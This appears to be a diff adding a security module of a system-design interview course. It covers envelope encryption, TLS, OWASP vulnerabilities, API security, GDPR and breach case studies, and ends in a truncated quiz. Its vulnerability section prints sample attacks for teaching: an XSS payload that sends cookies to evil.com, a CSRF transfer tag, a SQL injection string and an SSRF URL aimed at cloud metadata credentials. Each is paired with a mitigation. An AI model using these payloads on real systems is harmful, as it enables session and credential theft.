+                        Rather than encrypting all data with a single key (risky and slow for re-encryption), envelope encryption uses a hierarchy of keys:
+                    </p>
+                    <div class="diagram-container">
+                        <div class="mermaid">
+flowchart TD
+    A["Root Key (in HSM)"] -->|"Encrypts"| B["Key Encryption Key (KEK)"]
+    B -->|"Encrypts"| C["Data Encryption Key (DEK)"]
+    C -->|"Encrypts"| D["Your Data"]
+
+    E["To decrypt:"] --> F["HSM unwraps KEK"]
+    F --> G["KEK unwraps DEK"]
+    G --> H["DEK decrypts data"]
+
+    style A fill:#e53e3e,color:#fff
+    style B fill:#dd6b20,color:#fff
+    style C fill:#38a169,color:#fff
+    style D fill:#3182ce,color:#fff
+                        </div>
+                    </div>
+
+                    <p><strong>Why envelope encryption?</strong></p>
+                    <ul>
+                        <li><strong>Performance:</strong> Encrypt data with fast AES-256 (DEK). Only the small DEK is encrypted with the slower KMS key.</li>
+                        <li><strong>Key rotation:</strong> Rotate the KEK without re-encrypting all data. Just re-encrypt the DEKs.</li>
+                        <li><strong>Scope:</strong> Each object/record can have its own DEK, limiting blast radius.</li>
+                    </ul>
+
+                    <pre class="code-block"><code># AWS KMS envelope encryption example (Python boto3):
+import boto3
+from cryptography.fernet import Fernet
+
+kms = boto3.client('kms')
+
+# Step 1: Generate a data encryption key
+response = kms.generate_data_key(
+    KeyId='alias/my-master-key',
+    KeySpec='AES_256'
+)
+plaintext_dek = response['Plaintext']    # Use to encrypt data
+encrypted_dek = response['CiphertextBlob']  # Store alongside encrypted data
+
+# Step 2: Encrypt data with the DEK
+cipher = Fernet(base64.urlsafe_b64encode(plaintext_dek))
+encrypted_data = cipher.encrypt(b"sensitive data here")
+
+# Step 3: Store encrypted_dek + encrypted_data together
+# Step 4: Securely delete plaintext_dek from memory
+del plaintext_dek</code></pre>
+
+                    <h3>Encryption in Transit</h3>
+                    <h4>TLS 1.3</h4>
+                    <p>TLS 1.3 is the current standard for encrypting data in transit. Improvements over TLS 1.2:</p>
+                    <ul>
+                        <li><strong>Faster handshake:</strong> 1-RTT (vs 2-RTT in TLS 1.2). Supports 0-RTT resumption.</li>
+                        <li><strong>Removed insecure ciphers:</strong> No more RSA key exchange, RC4, SHA-1, or CBC mode</li>
+                        <li><strong>Forward secrecy required:</strong> All cipher suites use ephemeral Diffie-Hellman</li>
+                        <li><strong>Encrypted handshake:</strong> Server certificate is encrypted (privacy improvement)</li>
+                    </ul>
+
+                    <h4>Certificate Management at Scale</h4>
+                    <p>Managing TLS certificates for thousands of services is a real operational challenge:</p>
+                    <ul>
+                        <li><strong>Let's Encrypt + cert-manager:</strong> Automated certificate issuance and renewal in Kubernetes</li>
+                        <li><strong>Internal CA:</strong> For mTLS between services, use an internal certificate authority (HashiCorp Vault, SPIRE)</li>
+                        <li><strong>Short-lived certificates:</strong> 24-hour certificates that auto-rotate reduce the impact of compromise</li>
+                    </ul>
+
+                    <h3>End-to-End Encryption (E2EE)</h3>
+                    <p>
+                        With E2EE, data is encrypted on the sender's device and decrypted only on the recipient's device. The server never sees plaintext. Used by Signal, WhatsApp, and iMessage.
+                    </p>
+                    <p><strong>The Signal Protocol:</strong></p>
+                    <ul>
+                        <li><strong>Double Ratchet Algorithm:</strong> Derives new encryption keys for every message (forward secrecy + break-in recovery)</li>
+                        <li><strong>X3DH Key Agreement:</strong> Allows asynchronous key exchange (can send a message even if recipient is offline)</li>
+                        <li><strong>Sealed Sender:</strong> Even metadata (who sent the message) is hidden from the server</li>
+                    </ul>
+
+                    <h3>Key Management Best Practices</h3>
+                    <ul>
+                        <li><strong>Never store keys in code:</strong> Use KMS (AWS KMS, GCP Cloud KMS, Azure Key Vault)</li>
+                        <li><strong>Rotate keys regularly:</strong> Automate rotation with zero downtime</li>
+                        <li><strong>Separate key management from data:</strong> The service that encrypts shouldn't manage keys</li>
+                        <li><strong>Audit key access:</strong> Log every key usage for compliance</li>
+                        <li><strong>Use HSMs for root keys:</strong> Hardware Security Modules provide tamper-evident key storage</li>
+                    </ul>
+
+                    <div class="staff-signal">
+                        <strong>Staff-Level Signal:</strong> In interviews, when discussing data storage, proactively say: "We'll use envelope encryption with AWS KMS. Each record gets its own DEK encrypted by a KMS-managed KEK. This gives us per-record encryption scope, fast key rotation, and compliance with SOC 2 / HIPAA requirements." This demonstrates both depth and operational awareness.
+                    </div>
+                </div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- SECTION 8: Common Vulnerabilities (OWASP) -->
+            <!-- ============================================================ -->
+            <h2>8. Common Vulnerabilities (OWASP Top 10)</h2>
+
+            <div class="collapsible open">
+                <div class="collapsible-header">
+                    <span>What Staff Engineers Must Know</span>
+                </div>
+                <div class="collapsible-content">
+                    <p>You don't need to be a penetration tester, but you must understand common attack vectors and their mitigations.</p>
+
+                    <h3>SQL Injection</h3>
+                    <p><strong>Attack:</strong> Attacker injects SQL into user input that gets concatenated into a query.</p>
+                    <pre class="code-block"><code># VULNERABLE:
+query = f"SELECT * FROM users WHERE email = '{user_input}'"
+# If user_input = "' OR '1'='1' --"
+# Result: SELECT * FROM users WHERE email = '' OR '1'='1' --'
+# Returns ALL users!
+
+# SAFE: Parameterized query
+cursor.execute("SELECT * FROM users WHERE email = %s", (user_input,))
+
+# SAFE: ORM (SQLAlchemy)
+user = session.query(User).filter(User.email == user_input).first()</code></pre>
+
+                    <h3>Cross-Site Scripting (XSS)</h3>
+                    <p><strong>Attack:</strong> Attacker injects JavaScript that executes in other users' browsers.</p>
+                    <ul>
+                        <li><strong>Stored XSS:</strong> Malicious script saved in database (e.g., in a comment), served to all viewers</li>
+                        <li><strong>Reflected XSS:</strong> Malicious script in URL parameter, reflected in response</li>
+                        <li><strong>DOM XSS:</strong> Client-side JavaScript processes untrusted data into DOM</li>
+                    </ul>
+                    <p><strong>Prevention:</strong></p>
+                    <pre class="code-block"><code>&lt;!-- VULNERABLE: --&gt;
+&lt;div&gt;Welcome, ${userName}&lt;/div&gt;
+&lt;!-- If userName = &lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt; --&gt;
+
+&lt;!-- SAFE: Output encoding --&gt;
+&lt;div&gt;Welcome, ${escapeHtml(userName)}&lt;/div&gt;
+
+&lt;!-- SAFE: Content Security Policy header --&gt;
+Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com;
+&lt;!-- Blocks inline scripts and scripts from unauthorized domains --&gt;</code></pre>
+
+                    <h3>Cross-Site Request Forgery (CSRF)</h3>
+                    <p><strong>Attack:</strong> Attacker tricks a logged-in user's browser into making an unintended request.</p>
+                    <pre class="code-block"><code>&lt;!-- On evil.com: --&gt;
+&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=10000" /&gt;
+&lt;!-- Victim's browser sends their bank cookies automatically! --&gt;</code></pre>
+                    <p><strong>Prevention:</strong></p>
+                    <ul>
+                        <li><strong>SameSite cookies:</strong> <code>SameSite=Lax</code> or <code>SameSite=Strict</code> prevents cookies from being sent on cross-origin requests</li>
+                        <li><strong>CSRF tokens:</strong> Server generates a unique token per form; validates on submission</li>
+                        <li><strong>Check Origin/Referer headers:</strong> Verify requests come from your domain</li>
+                    </ul>
+
+                    <h3>Server-Side Request Forgery (SSRF)</h3>
+                    <p><strong>Attack:</strong> Attacker tricks the server into making requests to internal resources.</p>
+                    <pre class="code-block"><code># Vulnerable endpoint that fetches a URL:
+@app.route('/fetch')
+def fetch_url():
+    url = request.args.get('url')
+    return requests.get(url).text
+
+# Attacker requests:
+# /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# This accesses the AWS metadata service from inside the network!
+
+# Prevention:
+# 1. Allowlist of permitted domains/IPs
+# 2. Block RFC 1918 ranges (10.x, 172.16-31.x, 192.168.x) and link-local (169.254.x)
+# 3. Use IMDSv2 on AWS (requires PUT with token)
+# 4. Run with restricted network policies</code></pre>
+
+                    <h3>Broken Access Control</h3>
+                    <p><strong>Attack:</strong> User accesses resources or actions they shouldn't be allowed to.</p>
+                    <pre class="code-block"><code># VULNERABLE: Insecure Direct Object Reference (IDOR)
+@app.route('/api/invoices/&lt;invoice_id&gt;')
+def get_invoice(invoice_id):
+    return db.get_invoice(invoice_id)  # No ownership check!
+    # User A can access User B's invoice by guessing the ID
+
+# SAFE:
+@app.route('/api/invoices/&lt;invoice_id&gt;')
+@require_auth
+def get_invoice(invoice_id):
+    invoice = db.get_invoice(invoice_id)
+    if invoice.owner_id != current_user.id:
+        abort(403)  # Forbidden
+    return invoice</code></pre>
+
+                    <h3>Quick Reference: OWASP Top 10 (2021)</h3>
+                    <table class="threat-model-table">
+                        <thead>
+                            <tr>
+                                <th>#</th>
+                                <th>Vulnerability</th>
+                                <th>Key Mitigation</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr><td>A01</td><td>Broken Access Control</td><td>Server-side enforcement, deny by default</td></tr>
+                            <tr><td>A02</td><td>Cryptographic Failures</td><td>Encrypt sensitive data, use strong algorithms</td></tr>
+                            <tr><td>A03</td><td>Injection</td><td>Parameterized queries, input validation</td></tr>
+                            <tr><td>A04</td><td>Insecure Design</td><td>Threat modeling, secure design patterns</td></tr>
+                            <tr><td>A05</td><td>Security Misconfiguration</td><td>Hardened defaults, remove debug endpoints</td></tr>
+                            <tr><td>A06</td><td>Vulnerable Components</td><td>Dependency scanning, patching</td></tr>
+                            <tr><td>A07</td><td>Auth Failures</td><td>MFA, rate limiting, credential stuffing protection</td></tr>
+                            <tr><td>A08</td><td>Software/Data Integrity Failures</td><td>Signed updates, CI/CD pipeline security</td></tr>
+                            <tr><td>A09</td><td>Logging &amp; Monitoring Failures</td><td>Audit logs, alerting, incident response</td></tr>
+                            <tr><td>A10</td><td>SSRF</td><td>URL allowlists, network segmentation</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- SECTION 9: API Security -->
+            <!-- ============================================================ -->
+            <h2>9. API Security</h2>
+
+            <div class="collapsible open">
+                <div class="collapsible-header">
+                    <span>Securing APIs at Scale</span>
+                </div>
+                <div class="collapsible-content">
+
+                    <h3>Rate Limiting and Throttling</h3>
+                    <p>Prevent abuse and protect backend services from overload:</p>
+                    <ul>
+                        <li><strong>Per-user limits:</strong> 100 requests/minute per authenticated user</li>
+                        <li><strong>Per-IP limits:</strong> For unauthenticated endpoints (login, registration)</li>
+                        <li><strong>Per-endpoint limits:</strong> Expensive operations get lower limits</li>
+                        <li><strong>Adaptive rate limiting:</strong> Tighten limits when system is under load</li>
+                    </ul>
+                    <pre class="code-block"><code># Rate limit response headers (standard practice):
+HTTP/1.1 429 Too Many Requests
+X-RateLimit-Limit: 100
+X-RateLimit-Remaining: 0
+X-RateLimit-Reset: 1699999999
+Retry-After: 30</code></pre>
+
+                    <h3>Input Validation and Sanitization</h3>
+                    <p>Validate on the server side. Client-side validation is for UX, not security.</p>
+                    <pre class="code-block"><code># Python (Pydantic for API input validation):
+from pydantic import BaseModel, EmailStr, constr, validator
+
+class CreateUserRequest(BaseModel):
+    email: EmailStr
+    name: constr(min_length=1, max_length=100, pattern=r'^[a-zA-Z\s\-]+$')
+    age: int
+
+    @validator('age')
+    def validate_age(cls, v):
+        if not 13 &lt;= v &lt;= 150:
+            raise ValueError('Age must be between 13 and 150')
+        return v
+
+# Rejects:
+# {"email": "not-an-email", "name": "&lt;script&gt;alert(1)&lt;/script&gt;", "age": -1}</code></pre>
+
+                    <h3>API Keys vs OAuth</h3>
+                    <table class="threat-model-table">
+                        <thead>
+                            <tr>
+                                <th>Aspect</th>
+                                <th>API Keys</th>
+                                <th>OAuth Tokens</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Identity</td>
+                                <td>Identifies the application</td>
+                                <td>Identifies the user + application</td>
+                            </tr>
+                            <tr>
+                                <td>Permissions</td>
+                                <td>Broad (all-or-nothing)</td>
+                                <td>Scoped (granular permissions)</td>
+                            </tr>
+                            <tr>
+                                <td>Revocation</td>
+                                <td>Manual regeneration</td>
+                                <td>Token expiry + refresh flow</td>
+                            </tr>
+                            <tr>
+                                <td>Use case</td>
+                                <td>Server-to-server, public APIs (Google Maps)</td>
+                                <td>User-context operations, delegated access</td>
+                            </tr>
+                            <tr>
+                                <td>Security</td>
+                                <td>Lower (often leaked in client code)</td>
+                                <td>Higher (short-lived, scoped)</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <h3>CORS (Cross-Origin Resource Sharing)</h3>
+                    <p>Browsers block cross-origin requests by default. CORS headers tell the browser which origins are allowed:</p>
+                    <pre class="code-block"><code># Restrictive (recommended):
+Access-Control-Allow-Origin: https://app.example.com
+Access-Control-Allow-Methods: GET, POST
+Access-Control-Allow-Headers: Authorization, Content-Type
+Access-Control-Allow-Credentials: true
+Access-Control-Max-Age: 3600
+
+# DANGEROUS - never do this in production:
+Access-Control-Allow-Origin: *
+# This allows ANY website to make requests to your API</code></pre>
+
+                    <h3>Request Signing (AWS Signature V4)</h3>
+                    <p>For high-security APIs, sign requests to prove identity and ensure integrity:</p>
+                    <ol>
+                        <li>Create a canonical request string (method, path, query params, headers, payload hash)</li>
+                        <li>Create a string to sign (algorithm, timestamp, scope, hash of canonical request)</li>
+                        <li>Calculate the signature using HMAC-SHA256 with a derived signing key</li>
+                        <li>Add signature to the <code>Authorization</code> header</li>
+                    </ol>
+                    <pre class="code-block"><code># AWS Signature V4 Authorization header:
+Authorization: AWS4-HMAC-SHA256
+  Credential=AKID/20240101/us-east-1/s3/aws4_request,
+  SignedHeaders=content-type;host;x-amz-date,
+  Signature=e3b0c44298fc1c149afbf4c8996fb924...</code></pre>
+                    <p>
+                        This ensures: (1) the caller has the secret key, (2) the request wasn't tampered with, and (3) the request is fresh (timestamp-based).
+                    </p>
+
+                    <div class="staff-signal">
+                        <strong>Staff-Level Signal:</strong> When designing a public API, mention defense in depth: "We'll use OAuth for authentication, rate limiting per user and per IP, input validation with strict schemas, request signing for sensitive operations, and CORS restricted to known client origins. For internal APIs, we add mTLS."
+                    </div>
+                </div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- SECTION 10: Data Privacy & Compliance -->
+            <!-- ============================================================ -->
+            <h2>10. Data Privacy &amp; Compliance</h2>
+
+            <div class="collapsible open">
+                <div class="collapsible-header">
+                    <span>GDPR, PII Handling, and Audit Logging</span>
+                </div>
+                <div class="collapsible-content">
+
+                    <h3>GDPR Key Requirements for System Design</h3>
+                    <p>The General Data Protection Regulation affects how you design data storage and processing:</p>
+                    <table class="threat-model-table">
+                        <thead>
+                            <tr>
+                                <th>Right</th>
+                                <th>System Design Implication</th>
+                                <th>Implementation</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Right to be Forgotten</strong></td>
+                                <td>Must delete all user data on request</td>
+                                <td>Soft-delete with async hard-delete pipeline. Track all data locations. Challenge: data in backups, caches, analytics.</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Data Portability</strong></td>
+                                <td>Must export user data in machine-readable format</td>
+                                <td>API endpoint that generates a full export. Google Takeout is a reference implementation.</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Data Minimization</strong></td>
+                                <td>Collect only what's needed</td>
+                                <td>Design schemas with purpose limitation. Don't store "just in case" data.</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Consent</strong></td>
+                                <td>Explicit opt-in required</td>
+                                <td>Consent management system with versioned policies. Track what user consented to and when.</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Breach Notification</strong></td>
+                                <td>72-hour notification window</td>
+                                <td>Automated breach detection, incident response runbooks, pre-drafted notification templates.</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <h3>PII Handling Strategies</h3>
+
+                    <h4>Tokenization</h4>
+                    <p>Replace sensitive data with non-sensitive tokens. The mapping is stored in a secure vault.</p>
+                    <pre class="code-block"><code># Credit card tokenization:
+# Real: 4532-1234-5678-9012
+# Token: tok_a1b2c3d4e5f6 (random, no mathematical relationship)
+
+# The token is safe to store in application databases, logs, and analytics.
+# Only the token vault can map back to the real number.
+# Used by Stripe, payment processors.</code></pre>
+
+                    <h4>Hashing (One-Way)</h4>
+                    <pre class="code-block"><code># For data you need to match but never read back (passwords, SSN lookups):
+import hashlib, secrets
+
+salt = secrets.token_hex(16)
+hashed = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000)
+
+# For passwords specifically, use bcrypt or argon2:
+import bcrypt
+hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))</code></pre>
+
+                    <h4>Data Masking</h4>
+                    <pre class="code-block"><code># Show partial data for verification without exposing the full value:
+email: "j***@example.com"
+phone: "***-***-4567"
+SSN:   "***-**-6789"
+card:  "****-****-****-9012"</code></pre>
+
+                    <h3>Audit Logging Requirements</h3>
+                    <p>Every access to sensitive data must be logged for compliance:</p>
+                    <pre class="code-block"><code>{
+  "timestamp": "2024-01-15T10:30:00Z",
+  "actor": {
+    "user_id": "user-12345",
+    "ip_address": "203.0.113.50",
+    "user_agent": "Mozilla/5.0..."
+  },
+  "action": "READ",
+  "resource": {
+    "type": "customer_record",
+    "id": "cust-67890",
+    "fields_accessed": ["name", "email", "phone"]
+  },
+  "authorization": {
+    "policy": "customer-support-read",
+    "decision": "ALLOW",
+    "reason": "role:support-agent, ticket:TICK-111"
+  },
+  "context": {
+    "service": "customer-portal",
+    "trace_id": "abc-123-def-456"
+  }
+}</code></pre>
+
+                    <ul>
+                        <li><strong>Immutable logs:</strong> Write to append-only storage (S3 with Object Lock, WORM storage)</li>
+                        <li><strong>Separate access:</strong> Audit logs stored separately from application data; restricted access</li>
+                        <li><strong>Retention:</strong> Keep logs for 1-7 years depending on regulation (HIPAA: 6 years, SOX: 7 years)</li>
+                    </ul>
+
+                    <div class="staff-signal">
+                        <strong>Staff-Level Signal:</strong> When designing a system that handles PII, proactively mention: "I'd separate PII into a dedicated data store with encryption at rest, strict ACLs, and comprehensive audit logging. We'd implement tokenization so application services work with tokens instead of raw PII. For GDPR compliance, we need a data deletion pipeline that covers primary storage, backups, caches, and analytics systems."
+                    </div>
+                </div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- SECTION 11: Real-World Case Studies -->
+            <!-- ============================================================ -->
+            <h2>11. Real-World Case Studies</h2>
+
+            <div class="collapsible open">
+                <div class="collapsible-header">
+                    <span>Lessons from AWS IAM, Google BeyondCorp, and Equifax</span>
+                </div>
+                <div class="collapsible-content">
+
+                    <h3>AWS IAM at Scale</h3>
+                    <p>
+                        AWS Identity and Access Management handles authorization for every single AWS API call globally. Key design decisions:
+                    </p>
+                    <ul>
+                        <li><strong>Policy language:</strong> JSON-based policies with Effect (Allow/Deny), Action, Resource, and Condition blocks</li>
+                        <li><strong>Evaluation logic:</strong> Explicit Deny &gt; Explicit Allow &gt; Implicit Deny. This ensures that deny policies always win.</li>
+                        <li><strong>Policy types:</strong> Identity-based (attached to users/roles), Resource-based (attached to resources like S3 buckets), SCPs (organization-level guardrails), Permission boundaries</li>
+                        <li><strong>Scale:</strong> Evaluates policies on every API call. Caches policy evaluations aggressively. Eventually consistent (policy changes can take seconds to propagate).</li>
+                        <li><strong>Assume Role:</strong> Services and users assume temporary roles with scoped permissions. No long-lived credentials needed.</li>
+                    </ul>
+
+                    <pre class="code-block"><code>// AWS IAM Policy Example:
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "s3:GetObject",
+        "s3:PutObject"
+      ],
+      "Resource": "arn:aws:s3:::my-bucket/user/${aws:username}/*",
+      "Condition": {
+        "IpAddress": {"aws:SourceIp": "203.0.113.0/24"},
+        "Bool": {"aws:MultiFactorAuthPresent": "true"}
+      }
+    }
+  ]
+}</code></pre>
+
+                    <h3>Google BeyondCorp in Practice</h3>
+                    <p>Key architectural components of BeyondCorp:</p>
+                    <ul>
+                        <li><strong>Device Inventory Service:</strong> Tracks every device's state &mdash; OS version, patches, disk encryption, certificate validity</li>
+                        <li><strong>Access Proxy:</strong> All access to internal applications goes through a proxy that enforces policies</li>
+                        <li><strong>Access Control Engine:</strong> Evaluates policies in real-time: user identity + device trust level + context = access decision</li>
+                        <li><strong>Trust Levels:</strong> Devices are assigned trust tiers. Higher trust required for more sensitive applications.</li>
+                        <li><strong>No VPN:</strong> Internal applications are accessible from any network. The access proxy handles authentication and authorization.</li>
+                    </ul>
+                    <p>
+                        <strong>Impact:</strong> Google migrated 100,000+ employees to BeyondCorp over several years. The result: employees can work from anywhere without VPN, and the security posture is stronger because every request is verified regardless of network location.
+                    </p>
+
+                    <h3>Equifax Breach (2017): Lessons Learned</h3>
+                    <p>
+                        One of the worst data breaches in history: 147 million people's SSNs, birth dates, and addresses exposed.
+                    </p>
+                    <h4>What Went Wrong</h4>
+                    <ul>
+                        <li><strong>Unpatched vulnerability:</strong> Apache Struts CVE-2017-5638 was disclosed in March 2017. Equifax didn't patch for over 2 months.</li>
+                        <li><strong>No network segmentation:</strong> Once attackers got in, they could move laterally across internal systems.</li>
+                        <li><strong>Expired SSL certificate:</strong> A TLS inspection tool's certificate had expired 19 months earlier. Encrypted exfiltration traffic went undetected.</li>
+                        <li><strong>Plaintext credentials:</strong> Database credentials found in plaintext config files.</li>
+                        <li><strong>No encryption at rest:</strong> 147M SSNs stored unencrypted.</li>
+                    </ul>
+
+                    <h4>What Should Have Been Done</h4>
+                    <table class="threat-model-table">
+                        <thead>
+                            <tr>
+                                <th>Failure</th>
+                                <th>Correct Practice</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Unpatched software</td>
+                                <td>Automated vulnerability scanning, SLA for critical patches (&lt;48 hours)</td>
+                            </tr>
+                            <tr>
+                                <td>No segmentation</td>
+                                <td>Network segmentation, micro-segmentation, zero trust</td>
+                            </tr>
+                            <tr>
+                                <td>Expired certificates</td>
+                                <td>Certificate monitoring and automated renewal</td>
+                            </tr>
+                            <tr>
+                                <td>Plaintext credentials</td>
+                                <td>Secrets management (Vault, AWS Secrets Manager)</td>
+                            </tr>
+                            <tr>
+                                <td>No encryption at rest</td>
+                                <td>Encrypt all PII with envelope encryption</td>
+                            </tr>
+                            <tr>
+                                <td>Delayed detection</td>
+                                <td>SIEM, anomaly detection, data loss prevention (DLP)</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <div class="staff-signal">
+                        <strong>Staff-Level Signal:</strong> Referencing real-world incidents like Equifax shows that you think about security as an operational concern, not just a theoretical one. In an interview, you might say: "We need automated vulnerability scanning with strict patch SLAs. The Equifax breach showed that a single unpatched server and lack of network segmentation can expose hundreds of millions of records."
+                    </div>
+                </div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- SECTION 12: Summary & Interview Tips -->
+            <!-- ============================================================ -->
+            <h2>12. Interview Cheat Sheet</h2>
+
+            <div class="collapsible open">
+                <div class="collapsible-header">
+                    <span>Security Talking Points for System Design</span>
+                </div>
+                <div class="collapsible-content">
+                    <h3>Security Checklist for Any System Design</h3>
+                    <div class="card">
+                        <ul>
+                            <li><strong>Authentication:</strong> "Users authenticate via OIDC. Services use mTLS with SPIFFE identities."</li>
+                            <li><strong>Authorization:</strong> "RBAC for user-facing features. ABAC for fine-grained resource access."</li>
+                            <li><strong>Encryption:</strong> "TLS 1.3 in transit. AES-256 envelope encryption at rest via KMS."</li>
+                            <li><strong>Input validation:</strong> "Strict schema validation on all API inputs. Parameterized queries."</li>
+                            <li><strong>Rate limiting:</strong> "Per-user and per-IP rate limits at the API gateway."</li>
+                            <li><strong>Secrets:</strong> "No hardcoded secrets. Use Vault / AWS Secrets Manager with auto-rotation."</li>
+                            <li><strong>Audit:</strong> "All data access logged to immutable audit trail."</li>
+                            <li><strong>PII:</strong> "Tokenized PII in a separate encrypted store with strict ACLs."</li>
+                            <li><strong>Network:</strong> "Service mesh with mTLS. Network policies for micro-segmentation."</li>
+                        </ul>
+                    </div>
+
+                    <h3>Common Interview Follow-Up Questions</h3>
+                    <table class="threat-model-table">
+                        <thead>
+                            <tr>
+                                <th>Question</th>
+                                <th>Strong Answer Includes</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>"How do you handle authentication?"</td>
+                                <td>OIDC for users, mTLS + SPIFFE for services, short-lived JWTs, refresh token rotation</td>
+                            </tr>
+                            <tr>
+                                <td>"What if a token is compromised?"</td>
+                                <td>Short TTL (5-15 min), token blocklist in Redis, refresh token rotation with reuse detection</td>
+                            </tr>
+                            <tr>
+                                <td>"How do you handle PII?"</td>
+                                <td>Separate encrypted store, tokenization, audit logging, GDPR deletion pipeline</td>
+                            </tr>
+                            <tr>
+                                <td>"How do services talk to each other securely?"</td>
+                                <td>mTLS with SPIFFE/SPIRE, service mesh (Istio/Linkerd), zero trust &mdash; no network-based trust</td>
+                            </tr>
+                            <tr>
+                                <td>"What about key management?"</td>
+                                <td>Cloud KMS for envelope encryption, HSM-backed root keys, automated rotation, audit trail</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <h3>Red Flags to Avoid</h3>
+                    <ul>
+                        <li>Storing passwords in plaintext or MD5/SHA-1 (use bcrypt/argon2)</li>
+                        <li>Using the implicit OAuth flow (deprecated; use Auth Code + PKCE)</li>
+                        <li>Storing JWTs in localStorage (vulnerable to XSS; use HttpOnly cookies)</li>
+                        <li>Trusting client-side validation as a security measure</li>
+                        <li>Using <code>Access-Control-Allow-Origin: *</code> with credentials</li>
+                        <li>Not mentioning encryption at rest for sensitive data</li>
+                        <li>Relying solely on network perimeter for security (no zero trust thinking)</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- ============================================================ -->
+            <!-- SECTION 13: Self-Check Quiz -->
+            <!-- ============================================================ -->
+            <h2>Self-Check Quiz</h2>
+
+            <div class="quiz-container" id="module-quiz"></div>
+
+            <!-- ============================================================ -->
+            <!-- Flashcard Suggestions -->
+            <!-- ============================================================ -->
+            <h2>Suggested Flashcards</h2>
+            <div class="card">
+                <ol>
+                    <li><strong>Q:</strong> What is the difference between OAuth 2.0 and OpenID Connect?<br>
+                        <strong>A:</strong> OAuth 2.0 is for authorization (granting access). OIDC adds authentication (identity) on top via the id_token.</li>
+                    <li><strong>Q:</strong> Why is RS256 preferred over HS256 in microservices?<br>
+                        <strong>A:</strong> RS256 uses asymmetric keys &mdash; only the auth service has the private key. HS256 requires sharing the secret with every verifier, increasing blast radius.</li>
+                    <li><strong>Q:</strong> What is envelope encryption?<br>
+                        <strong>A:</strong> Data is encrypted with a DEK; the DEK is encrypted with a KEK managed by KMS. Enables fast encryption, per-record scope, and key rotation without re-encrypting data.</li>
+                    <li><strong>Q:</strong> What are the three principles of Zero Trust?<br>
+                        <strong>A:</strong> Verify explicitly, use least privilege access, and assume breach.</li>
+                    <li><strong>Q:</strong> How do you revoke a JWT?<br>
+                        <strong>A:</strong> Short TTL (5-15 min), token blocklist (Redis), token versioning per user, or refresh token rotation with reuse detection.</li>
+                </ol>
+            </div>
+
+            <!-- Navigation -->
+            <div class="flex flex-between mt-4">
+                <a href="module-18.html" class="btn btn-secondary">&larr; Previous: Monitoring &amp; Reliability</a>
+                <a href="module-20.html" class="btn btn-primary">Next: Staff-Level Design Thinking &rarr;</a>
+            </div>
+        </main>
+    </div>
+
+    <script src="../assets/js/app.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const sidebar = document.getElementById('sidebar');
+            const sidebarToggle = document.getElementById('sidebarToggle');
+            const sidebarOverlay = document.getElementById('sidebarOverlay');
+
+            if (sidebarToggle) {
+                sidebarToggle.addEventListener('click', () => {
+                    sidebar.classList.toggle('open');
+                    sidebarOverlay.classList.toggle('open');
+                });
+            }
+
+            if (sidebarOverlay) {
+                sidebarOverlay.addEventListener('click', () => {
+                    sidebar.classList.remove('open');
+                    sidebarOverlay.classList.remove('open');
+                });
+            }
+
+            const quizQuestions = [
+                {
+                    question: "What does PKCE protect against in OAuth 2.0?",
+                    options: [
+                        "Cross-site scripting attacks",
+                        "Authorization code interception on public clients",
+                        "SQL injection in the token endpoint",
+                        "Brute force password attacks"
+                    ],
+                    correct: 1,
+                    explanation: "PKCE (Proof Key for Code Exchange) prevents attackers from exchanging a stolen authorization code because they don't have the code_verifier that was generated on the client."
+                },
+                {
+                    question: "In envelope encryption, what does the Data Encryption Key (DEK) encrypt?",
+                    options: [
+                        "The Key Encryption Key (KEK)",
+                        "The root key in the HSM",
+                        "The actual user data",
+                        "The TLS certificate"
+                    ],
+                    correct: 2,
+                    explanation: "The DEK encrypts the actual data. The DEK itself is encrypted by the KEK, which is managed by a KMS. This hierarchy enables fast encryption and easy key rotation."
+                },
+                {
+                    question: "Why is the OAuth 2.0 implicit flow deprecated?",
+                    options: [
+                        "It's too slow for modern applications",
+                        "It returns the access token directly in the URL fragment, exposing it to the browser",
+                        "It requires a client secret that mobile apps can't store",
+                        "It doesn't support refresh tokens"
+                    ],
+                    correct: 1,
+                    explanation: "The implicit flow returns the access token in the URL fragment, making it visible in browser history and vulnerable to interception. Authorization Code + PKCE is the recommended replacement."
+                },
+                {
+                    question: "What is the key difference between RBAC and ABAC?",
+                    options: [
+                        "RBAC is newer than ABAC",
+                        "RBAC assigns permissions to roles; ABAC evaluates attributes of user, resource, and context",
+                        "ABAC only works with OAuth tokens",
+                        "RBAC supports fine-grained access while ABAC is coarse-grained"
+                    ],
+                    correct: 1,
+                    explanation: "RBAC is role-based (admin, editor, viewer). ABAC is attribute-based and can evaluate any combination of user attributes, resource attributes, and environmental context for fine-grained decisions."
+                },
+                {
+                    question: "In Google's BeyondCorp model, how do employees access internal applications?",
+                    options: [
+                        "Through a corporate VPN from any location",
+                        "Only from within the corporate network",
+                        "Through an access proxy that verifies identity, device trust, and context on every request",
